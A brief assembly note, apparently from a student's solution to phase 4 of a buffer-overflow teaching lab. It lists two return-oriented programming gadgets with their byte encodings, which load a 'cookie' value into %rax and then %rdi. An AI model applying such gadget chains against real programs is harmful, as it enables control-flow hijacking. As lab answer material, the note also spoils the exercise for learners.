# the instruction chain we need for phase4
# which consist of several gadgets
pop %rax       # pop cookie(stored in $rsp) to %rax: 58 90 c3
mov %rax,%rdi  # 48 89 c7 c3
